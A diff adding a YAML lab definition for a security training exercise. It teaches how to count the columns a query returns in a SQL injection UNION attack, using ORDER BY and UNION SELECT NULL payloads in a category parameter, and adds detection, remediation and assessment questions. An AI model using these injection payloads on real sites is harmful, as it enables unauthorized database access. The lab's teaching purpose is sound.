@@ -1,0 +1,95 @@
+# Category: SQL Injection
+name: "SQL injection UNION attack, determining the number of columns returned by the query"
+id: "sql-injection-union-column-count-001"
+category: "sql_injection"
+subcategory: "union_attack"
+difficulty: "practitioner"
+estimated_time: "30 minutes"
+
+description: |
+  This lab contains a SQL injection vulnerability in the product category filter.
+  The attacker needs to determine the number of columns returned by the original
+  query using a UNION attack. This is a prerequisite for extracting data using
+  UNION attacks.
+
+learning_objectives:
+  - Understand UNION attacks
+  - Use `ORDER BY` to determine column count
+  - Use `UNION SELECT NULL` to determine column count
+
+tools:
+  - Burp Suite
+  - curl
+
+prerequisites:
+  - Basic understanding of SQL
+  - Access to the lab environment
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Identify the vulnerable parameter"
+    commands:
+      - "# Browse to the lab and select a category"
+      - "# Intercept the request in Burp Suite"
+    expected_output: "The category parameter is used in a SQL query"
+    detection: "None"
+
+  - id: "step2"
+    phase: "exploitation"
+    action: "Determine the number of columns using ORDER BY"
+    commands:
+      - "# Use ORDER BY with increasing numbers"
+      - "category=Gifts' ORDER BY 1--"
+      - "category=Gifts' ORDER BY 2--"
+      - "# Continue until an error occurs"
+    expected_output: "Number of columns identified"
+    detection: "Database error messages"
+
+  - id: "step3"
+    phase: "exploitation"
+    action: "Determine the number of columns using UNION SELECT"
+    commands:
+      - "# Use UNION SELECT with increasing NULLs"
+      - "category=Gifts' UNION SELECT NULL--"
+      - "category=Gifts' UNION SELECT NULL, NULL--"
+      - "# Continue until successful"
+    expected_output: "Number of columns identified"
+    detection: "Database error messages"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1190"
+    description: "Exploit Public-Facing Application"
+  - standard: "OWASP"
+    control: "A03:2021"
+    description: "Injection"
+
+detection:
+  network_indicators:
+    - "SQL keywords in URL parameters"
+  log_indicators:
+    - "Database error messages"
+  endpoint_indicators:
+    - "None"
+
+remediation:
+  immediate:
+    - "Use parameterized queries"
+  long_term:
+    - "Implement input validation"
+
+variables:
+  lab_url: "https://lab-id.web-security-academy.net"
+  category_param: "category"
+
+assessment_questions:
+  - "What is the difference between ORDER BY and UNION SELECT for column counting?"
+  - "Why is it important to know the number of columns?"
+  - "What happens if the number of columns in UNION does not match?"
+
+references:
+  - url: "https://portswigger.net/web-security/sql-injection"
+    title: "PortSwigger SQL Injection"
+  - url: "https://owasp.org/www-community/attacks/SQL_Injection"
+    title: "OWASP SQL Injection"
